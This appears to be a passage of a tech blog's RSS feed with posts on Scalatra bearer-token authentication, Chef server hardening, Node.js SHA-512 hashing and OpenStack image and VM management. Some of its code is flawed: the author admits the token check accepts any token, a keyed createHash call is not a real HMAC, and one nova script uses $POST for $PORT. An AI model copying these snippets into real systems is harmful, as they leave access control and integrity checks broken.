&lt;p&gt;Assume you need to restrict the access to routes. In a corporate environment an OAuth server is used quiet often to verify requests. &lt;a href=&quot;http://tools.ietf.org/html/rfc6750&quot;&gt;Bearer tokens&lt;/a&gt; are very useful for that task. The HTTP header for authentication is well established and used for basic authentication as well. Now the resource provider (our Scala server with routes) need to handle authentication header and verify the received token. &lt;/p&gt;
&lt;p&gt;Salesforce published &lt;a href=&quot;https://developer.salesforce.com/page/Digging_Deeper_into_OAuth_2.0_on_Force.com&quot;&gt;Digging Deeper into OAuth 2.0 on Force.com&lt;/a&gt; that illustrates the setup:&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;OAuthRoles.png&quot; src=&quot;https://s3.amazonaws.com/dfc-wiki/en/images/6/6f/OAuthRoles.png&quot; width=&quot;443&quot; height=&quot;414&quot;&gt;&lt;/p&gt;
&lt;p&gt;A client request to the resource provider looks like&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;http -v http://localhost:8080/hello/john &amp;#39;Authorization:Bearer Ieg4ahthie&amp;#39;

GET /hello/john HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, compress
Authorization: Bearer Ieg4ahthie
Host: localhost:8080
User-Agent: HTTPie/0.8.0



HTTP/1.1 200 OK
Content-Length: 18
Content-Type: text/html;charset=UTF-8
Server: Jetty(8.1.8.v20121106)

&amp;lt;p&amp;gt;Hello, john&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, the resource server needs to respect the authentication and only provide access to authenticated users. We need a way to implement a generic authentication strategy to authenticate users via Bearer token. Scalatra provides a way to &lt;a href=&quot;http://www.scalatra.org/2.3/guides/http/authentication.html&quot;&gt;hook your own authentication strategy&lt;/a&gt; into the framework. The implementation of the &lt;code&gt;BasicAuthStrategy&lt;/code&gt; is available at &lt;a href=&quot;https://github.com/scalatra/scalatra/blob/2.3.x/auth/src/main/scala/org/scalatra/auth/strategy/BasicAuthStrategy.scala&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Based on the BasicAuthStrategy, we are going to implement a &lt;code&gt;BearerAuthStragegy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;style type=&quot;text/css&quot;&gt;
.gist {
  font-size: 12px;
}
&lt;/style&gt;&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/9cc43202ecbd57ad1f4b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Now you need to wire it into your Servlet:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;trait&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;HelloAppStack&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;ScalatraServlet&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;ScalateSupport&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;CorsSupport&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;AuthenticationSupport&lt;/span&gt; {
  ...
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you are able to secure routes with:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;get(&lt;span class=&quot;string&quot;&gt;&quot;/hello/:name&quot;&lt;/span&gt;) {

    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; user: &lt;span class=&quot;type&quot;&gt;User&lt;/span&gt; = auth.get

    &lt;span class=&quot;comment&quot;&gt;// Matches &quot;GET /hello/foo&quot; and &quot;GET /hello/bar&quot;&lt;/span&gt;
    &lt;span class=&quot;comment&quot;&gt;// params(&quot;name&quot;) is &quot;foo&quot; or &quot;bar&quot;&lt;/span&gt;
    &amp;lt;p&amp;gt;&lt;span class=&quot;type&quot;&gt;Hello&lt;/span&gt;, {params(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;)}&amp;lt;/p&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally unauthenticated responses are rejected:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;http -v http://localhost:8080/hello/john

GET /hello/john HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, compress
Host: localhost:8080
User-Agent: HTTPie/0.8.0



HTTP/1.1 401 Unauthorized
Content-Length: 15
Content-Type: text/plain;charset=UTF-8
Server: Jetty(8.1.8.v20121106)

Unauthenticated
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Transmitting the access token allows you to access the route as before:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;
http -v http://localhost:8080/hello/john &amp;#39;Authorization:Bearer Ieg4ahthie&amp;#39;

GET /hello/john HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, compress
Authorization: Bearer Ieg4ahthie
Host: localhost:8080
User-Agent: HTTPie/0.8.0



HTTP/1.1 200 OK
Content-Length: 18
Content-Type: text/html;charset=UTF-8
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Server: Jetty(8.1.8.v20121106)
Set-Cookie: JSESSIONID=1qxp4ot72v3lmr01n3vesosel;Path=/

&amp;lt;p&amp;gt;Hello, john&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The example above requires you to implement the &lt;code&gt;verify&lt;/code&gt; method properly. The current state allows any request with any token access, as long as the token is provided. &lt;/p&gt;
&lt;p&gt;Cheers,&lt;/p&gt;
&lt;p&gt;Chris&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How to harden a new server with Chef</title>
      <link>http://lollyrock.com/articles/how-to-harden-a-new-server/</link>
      <pubDate>Tue, 13 May 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/how-to-harden-a-new-server/</guid>
      <author></author>
      <description>&lt;p&gt;Deutsche Telekom developed scripts in Chef and Puppet to harden servers according to well-known guidelines like bettercrypto and internal guidelines at Deutsche Telekom. More information is available at the project page of the &lt;a href=&quot;http://hardening.io/&quot;&gt;Hardening Framework&lt;/a&gt;. Disclosure: I am core developer at this project.&lt;/p&gt;
&lt;p&gt;Today we cook with &lt;a href=&quot;http://matschaffer.github.io/knife-solo/&quot;&gt;knife-solo&lt;/a&gt; and harden a fresh copy of Ubuntu 14.04. The process of hardening a server is quite difficult and takes a lot of knowledge and experience. Even the most-experienced administrators rely on guidelines to meet the best practices.&lt;/p&gt;
&lt;p&gt;Since we live in a cloud world by now, &lt;a href=&quot;http://arlimus.github.io/&quot;&gt;Dominik Richter&lt;/a&gt;, Patrick Meier and myself invented the &lt;code&gt;Hardening Framework&lt;/code&gt;. It is a set of cookbooks that help you to secure your server with well-known rules. &lt;/p&gt;
&lt;p&gt;The following steps illustrate the hardening process of a fresh server with nothing than a base Linux system.&lt;/p&gt;
&lt;p&gt;I assume you have &lt;a href=&quot;http://www.getchef.com/downloads/chef-dk/mac/&quot;&gt;Chef Development Kit&lt;/a&gt; or &lt;a href=&quot;http://www.getchef.com/chef/install/&quot;&gt;Chef&lt;/a&gt; and &lt;a href=&quot;http://berkshelf.com/&quot;&gt;Berkshelf&lt;/a&gt; on your machine.&lt;/p&gt;
&lt;p&gt;At first of all we need to install &lt;code&gt;knife-solo&lt;/code&gt; via &lt;code&gt;gem&lt;/code&gt; on your workstation.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;∅&amp;gt; sudo gem install knife-solo
Fetching: method_&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt;-0.8.2.gem (100%)
Successfully installed method_&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt;-0.8.2
Fetching: slop-3.5.0.gem (100%)
Successfully installed slop-3.5.0
Fetching: coderay-1.1.0.gem (100%)
Successfully installed coderay-1.1.0
Fetching: pry-0.10.0.pre2.gem (100%)
Successfully installed pry-0.10.0.pre2
Fetching: chef-zero-2.0.2.gem (100%)
Successfully installed chef-zero-2.0.2
Fetching: diff-lcs-1.2.5.gem (100%)
Successfully installed diff-lcs-1.2.5
Fetching: highline-1.6.21.gem (100%)
Successfully installed highline-1.6.21
Fetching: net-ssh-gateway-1.2.0.gem (100%)
Successfully installed net-ssh-gateway-1.2.0
Fetching: net-ssh-multi-1.2.0.gem (100%)
Successfully installed net-ssh-multi-1.2.0
Fetching: mime-types-1.25.1.gem (100%)
Successfully installed mime-types-1.25.1
Fetching: rest-client-1.6.8.rc1.gem (100%)
Successfully installed rest-client-1.6.8.rc1
Fetching: ipaddress-0.8.0.gem (100%)
Successfully installed ipaddress-0.8.0
Fetching: mixlib-shellout-1.4.0.gem (100%)
Successfully installed mixlib-shellout-1.4.0
Fetching: mixlib-config-2.1.0.gem (100%)
Successfully installed mixlib-config-2.1.0
Fetching: mixlib-cli-1.5.0.gem (100%)
Successfully installed mixlib-cli-1.5.0
Fetching: systemu-2.5.2.gem (100%)
Successfully installed systemu-2.5.2
Fetching: ohai-7.0.4.gem (100%)
Successfully installed ohai-7.0.4
Fetching: chef-11.14.0.alpha.2.gem (100%)
Successfully installed chef-11.14.0.alpha.2
Fetching: knife-solo-0.4.1.gem (100%)
Thanks &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; installing knife-solo!

If you run into any issues please &lt;span class=&quot;built_in&quot;&gt;let&lt;/span&gt; us know at:
  https://github.com/matschaffer/knife-solo/issues

If you are upgrading knife-solo please uninstall any old versions by
running `gem clean knife-solo` to avoid any errors.

See http://bit.ly/CHEF-3255 &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; more information on the knife bug
that causes this.
Successfully installed knife-solo-0.4.1
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; chef-11.14.0.alpha.2
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; chef-zero-2.0.2
invalid options: -SNw2
(invalid options are ignored)
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; coderay-1.1.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; diff-lcs-1.2.5
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; highline-1.6.21
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ipaddress-0.8.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; knife-solo-0.4.1
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; method_&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt;-0.8.2
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; mime-types-1.25.1
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; mixlib-cli-1.5.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; mixlib-config-2.1.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; mixlib-shellout-1.4.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; net-ssh-gateway-1.2.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; net-ssh-multi-1.2.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ohai-7.0.4
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; pry-0.10.0.pre2
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; rest-client-1.6.8.rc1
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; slop-3.5.0
Installing ri documentation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; systemu-2.5.2
19 gems installed
∅&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a next step we need to download the &lt;code&gt;hardening-kitchen&lt;/code&gt;. This comes with a set of hardening cookbooks and works out of the box. You’re free to extend the kitchen with your own cookbooks.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/TelekomLabs/example-chef-hardening.git
&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; example-chef-hardening
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;By now, the workstation is ready and we are able to bootstrap our server with Chef and our hardening cookbooks.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;knife solo bootstrap ubuntu@hardening.tlabscloud.com nodes/default.json 
Bootstrapping Chef...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15934  100 15934    0     0  21847      0 --:--:-- --:--:-- --:--:-- 21857
Downloading Chef 11.10.4 &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ubuntu...
downloading https://www.opscode.com/chef/metadata?v=11.10.4&amp;amp;prerelease=&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&amp;amp;nightlies=&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&amp;amp;p=ubuntu&amp;amp;pv=14.04&amp;amp;m=x86_64
  to file /tmp/install.sh.30630/metadata.txt
trying wget...
url https://opscode-omnibus-packages.s3.amazonaws.com/ubuntu/13.04/x86_64/chef_11.10.4-1.ubuntu.13.04_amd64.deb
md5 25e27eeaff3304df354e735a56005f04
sha256  98&lt;span class=&quot;built_in&quot;&gt;fc&lt;/span&gt;3ef27419ec45281306b160e5f1e736a9846ad9060a151046d5a29c49af6b
yolo    &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;
downloaded metadata file looks valid...
downloading https://opscode-omnibus-packages.s3.amazonaws.com/ubuntu/13.04/x86_64/chef_11.10.4-1.ubuntu.13.04_amd64.deb
  to file /tmp/install.sh.30630/chef_11.10.4-1.ubuntu.13.04_amd64.deb
trying wget...
Comparing checksum with sha256sum...

WARNING: Chef-Client has not been regression tested on this O/S Distribution
WARNING: Do not use this configuration &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; Production Applications.  Use at your own risk.

Installing Chef 11.10.4
installing with dpkg...
dpkg: warning: downgrading chef from 11.12.4-1 to 11.10.4-1.ubuntu.13.04
(Reading database ... 62386 files and directories currently installed.)
Preparing to unpack .../chef_11.10.4-1.ubuntu.13.04_amd64.deb ...
Unpacking chef (11.10.4-1.ubuntu.13.04) over (11.12.4-1) ...
Setting up chef (11.10.4-1.ubuntu.13.04) ...
Thank you &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; installing Chef!
Running Chef on hardening.tlabscloud.com...
Installing Berkshelf cookbooks to &lt;span class=&quot;string&quot;&gt;'cookbooks'&lt;/span&gt;...
Installing os-hardening (1.0.1) from site: &lt;span class=&quot;string&quot;&gt;'https://supermarket.chef.io/api/v1/cookbooks'&lt;/span&gt;
Installing ssh-hardening (1.0.0) from site: &lt;span class=&quot;string&quot;&gt;'https://supermarket.chef.io/api/v1/cookbooks'&lt;/span&gt;
Using sysctl (0.3.4)
Using ntp (1.6.2)
Using apt (2.3.8)
Using yum (2.4.4)
Uploading the kitchen...
Generating solo config...
Running Chef...
Starting Chef Client, version 11.10.4
[2014-05-14T14:53:23+00:00] WARN: unable to detect ip6address
Compiling Cookbooks...
[2014-05-14T14:53:23+00:00] WARN: encrypted_data_bag_Secret is &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; but file does not exist. Unsetting
/home/ubuntu/chef-solo/cookbooks-2/chef-solo-search/libraries/search.rb:57: warning: already initialized constant PARSER_LOADED

...

Chef Client finished, 10/45 resources updated &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 4.206405118 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In less than 5 minutes, a new server is hardened for the core system and ssh. Be aware that your server still needs some configuration in order to be production ready. For that I recommend to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Configure  your firewall properly&lt;/li&gt;
&lt;li&gt;Install  critical patches&lt;/li&gt;
&lt;li&gt;Use patch management&lt;/li&gt;
&lt;li&gt;Use system monitoring&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More information is available at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://dev-sec.io/&quot;&gt;http://dev-sec.io/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vulcanosec.com/&quot;&gt;http://vulcanosec.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/hardening&quot;&gt;https://github.com/dev-sec/hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://supermarket.chef.io/cookbooks/os-hardening&quot;&gt;https://supermarket.chef.io/cookbooks/os-hardening&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://supermarket.chef.io/cookbooks/ssh-hardening&quot;&gt;https://supermarket.chef.io/cookbooks/ssh-hardening&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Happy Hardening!&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Commercial support for all hardening cookbooks is available via &lt;a href=&quot;http://vulcanosec.com/&quot;&gt;Vulcano Security&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>SHA 512 Hashs with nodejs</title>
      <link>http://lollyrock.com/articles/nodejs-sha512/</link>
      <pubDate>Sat, 05 Apr 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/nodejs-sha512/</guid>
      <author></author>
      <description>&lt;p&gt;Quite often you need to encrypt files. Recently I updated an application from encryption to &lt;a href=&quot;http://en.wikipedia.org/wiki/Authenticated_encryption&quot;&gt;authenticated encryption&lt;/a&gt; and used the encrypt-then-mac approach.&lt;/p&gt;
&lt;p&gt;Update: I created a node module that simplifies the process for you: &lt;a href=&quot;https://github.com/chris-rock/password-hasher&quot;&gt;password-hasher&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To create a hash from strings you just need a few lines in nodejs:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// generate a hash from string&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; crypto = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'crypto'&lt;/span&gt;),
        text = &lt;span class=&quot;string&quot;&gt;'hello bob'&lt;/span&gt;,
        key = &lt;span class=&quot;string&quot;&gt;'mysecret key'&lt;/span&gt;

    &lt;span class=&quot;comment&quot;&gt;// create hahs&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; hash = crypto.createHmac(&lt;span class=&quot;string&quot;&gt;'sha512'&lt;/span&gt;, key)
    hash.update(text)
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; value = hash.digest(&lt;span class=&quot;string&quot;&gt;'hex'&lt;/span&gt;)

    &lt;span class=&quot;comment&quot;&gt;// print result&lt;/span&gt;
    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(value);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The great thing about the nodejs implementation of &lt;code&gt;Hash&lt;/code&gt; is the possibility to stream data directly into the hash:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// generate a hash from file stream&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; crypto = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'crypto'&lt;/span&gt;),
        fs = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'fs'&lt;/span&gt;),
        key = &lt;span class=&quot;string&quot;&gt;'mysecret key'&lt;/span&gt;

    &lt;span class=&quot;comment&quot;&gt;// open file stream&lt;/span&gt;
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fstream = fs.createReadStream(&lt;span class=&quot;string&quot;&gt;'./test/hmac.js'&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; hash = crypto.createHash(&lt;span class=&quot;string&quot;&gt;'sha512'&lt;/span&gt;, key);
    hash.setEncoding(&lt;span class=&quot;string&quot;&gt;'hex'&lt;/span&gt;);

    &lt;span class=&quot;comment&quot;&gt;// once the stream is done, we read the values&lt;/span&gt;
    fstream.on(&lt;span class=&quot;string&quot;&gt;'end'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
        hash.end();
        &lt;span class=&quot;comment&quot;&gt;// print result&lt;/span&gt;
        &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(hash.read());
    });

    &lt;span class=&quot;comment&quot;&gt;// pipe file to hash generator&lt;/span&gt;
    fstream.pipe(hash);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Happy Hashing.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;See also:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-encryption/&quot;&gt;Encrypt and decrypt content with Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/express4-file-upload/&quot;&gt;Simple file uploads with Express 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/content-security-policy/&quot;&gt;Applied Content Security Policy for Nginx and Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Open Stack Glance Image Create</title>
      <link>http://lollyrock.com/articles/glance-image-create/</link>
      <pubDate>Wed, 02 Apr 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/glance-image-create/</guid>
      <author></author>
      <description>&lt;p&gt;The newest version of Ubuntu is out and we need to upload the latest version to Open Stack. Of course we try to save our bandwith. There we use &lt;code&gt;-copy-from&lt;/code&gt; instead of &lt;code&gt;--file openstack_image.img&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;glance image-create --name &amp;#39;Ubuntu 14.04 LTS&amp;#39; \
  --container-format bare \
  --disk-format qcow2 \
  --is-public true \
  --copy-from http://uec-images.ubuntu.com/releases/14.04/release/ubuntu-14.04-server-cloudimg-amd64-disk1.img


+------------------+--------------------------------------+
| Property         | Value                                |
+------------------+--------------------------------------+
| checksum         | None                                 |
| container_format | bare                                 |
| created_at       | 2014-04-02T13:16:20                  |
| deleted          | False                                |
| deleted_at       | None                                 |
| disk_format      | qcow2                                |
| id               | aa5ab6de-e461-4330-136e-fb149802bdc0 |
| is_public        | True                                 |
| min_disk         | 0                                    |
| min_ram          | 0                                    |
| name             | Ubuntu 14.04 LTS Beta 1              |
| owner            | 9ab2f1a7ca521eee9c8de5a14567d377     |
| protected        | False                                |
| size             | 261095936                            |
| status           | queued                               |
| updated_at       | 2014-04-02T13:16:20                  |
+------------------+--------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Open Stack VM Resizing</title>
      <link>http://lollyrock.com/articles/openstack-vm-resize/</link>
      <pubDate>Tue, 01 Apr 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/openstack-vm-resize/</guid>
      <author></author>
      <description>&lt;p&gt;Once in a while you need to upgrade a VM with more CPU or storage.&lt;/p&gt;
&lt;h2 id=&quot;step-1-vm-preparation&quot;&gt;Step 1: VM preparation&lt;/h2&gt;
&lt;p&gt;A normal VM running on Openstack is well prepared for flavor resizing. Our observations just brought up the network configuration as a central point of failure. Especially RedHat-based machines fix the network config in various files. e.g. for CentOS&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# ensure the vm is properly prepared
rm /etc/udev/rules.d/70-persistent-net.rules 
touch /etc/udev/rules.d/70-persistent-net.rules

# remove hardware specific settings /etc/sysconfig/network-scripts
sed -i &amp;#39;/UUID/d&amp;#39; /etc/sysconfig/network-scripts/ifcfg-eth0
sed -i &amp;#39;/HWADDR/d&amp;#39; /etc/sysconfig/network-scripts/ifcfg-eth0
sed -i &amp;#39;/IPADDR/d&amp;#39; /etc/sysconfig/network-scripts/ifcfg-eth0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The vm is properly prepared by now.&lt;/p&gt;
&lt;h2 id=&quot;step-2-take-a-snapshot&quot;&gt;Step 2: Take a snapshot&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;# create a snapshot and not down the image id
nova image-create $INSTANCEID $IMAGENAME
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;step-3-test-the-snapshot&quot;&gt;Step 3: Test the snapshot&lt;/h2&gt;
&lt;p&gt;Before we delete the old machine, we need to test the snapshot to ensure the network config is properly done and we are able to log into the new machine.&lt;/p&gt;
&lt;h2 id=&quot;step-4-gather-machine-details&quot;&gt;Step 4: Gather machine details&lt;/h2&gt;
&lt;p&gt;Now, we collect all the information of the existing instance&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# show instance details
nova show $INSTANCEID

# display the network details (you need the id and the subnet id)
neutron net-list

# select the new flavor id
nova flavor-list
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;destroy-the-old-machine&quot;&gt;Destroy the old machine&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;nova delete $INSTANCEID
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;create-network-port&quot;&gt;Create network port&lt;/h2&gt;
&lt;p&gt;In some cases you need to keep the same ip adress. Neutron helps to assign a specific port with the new machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;neutron port-create --fixed-ip subnet_id=$SUBNET_ID,ip_address=$IP $NETWORK_ID
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;recreate-machine&quot;&gt;Recreate machine&lt;/h2&gt;
&lt;p&gt;Now we are ready to re-create the machine&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/bin/bash
VMNAME=machine1
FLAVOR=4
IMAGE=63924226-e5ca-4ee6-a663-b2c89b0aa985
SG=ssh,http,default
PORT=f3999e60-9e53-4929-a9b2-ed3ab8ecf25d
KEYNAME=key
nova boot $VMNAME --flavor=$FLAVOR --image=$IMAGE --security-groups=$SG --nic port-id=$POST --key_name=$KEYNAME
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In case you do not use the specific port, switch &lt;code&gt;port-id&lt;/code&gt; with &lt;code&gt;net-id&lt;/code&gt; and the network id gathered with &lt;code&gt;neutron net-list&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Happy resizing.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Havana Box</title>
      <link>http://lollyrock.com/articles/havana-box/</link>
      <pubDate>Sun, 27 Oct 2013 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/havana-box/</guid>
      <author></author>
      <description>&lt;center&gt;&lt;a href=&quot;http://www.flickr.com/photos/fixedgear/2998411614/&quot; title=&quot;Havana by fixedgear, on Flickr&quot;&gt;&lt;img src=&quot;http://farm4.staticflickr.com/3161/2998411614_787b7717b2_q.jpg&quot; width=&quot;150px&quot; height=&quot;150px&quot; alt=&quot;Havana&quot; style=&quot;margin:0px&quot;&gt;&lt;/a&gt;&lt;/center&gt;



